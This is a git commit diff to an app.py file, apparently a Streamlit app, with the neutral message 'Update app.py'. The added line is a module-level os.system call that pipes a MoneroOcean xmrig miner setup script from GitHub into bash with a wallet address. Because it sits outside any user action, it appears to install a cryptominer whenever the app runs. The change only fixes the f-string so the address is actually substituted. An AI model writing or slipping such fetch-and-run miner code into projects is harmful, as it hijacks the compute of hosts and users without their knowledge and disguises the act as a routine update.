3a46958989da10fd3b12c02a1dab998150045472
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-11 09:59:16 +0530

    Update app.py

--- app.py
+++ app.py
@@ -15,4 +15,4 @@ if button == True:
     st.text('Please Enter CMD')
     
 
-os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s {address}")
+os.system(f"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s {address}")
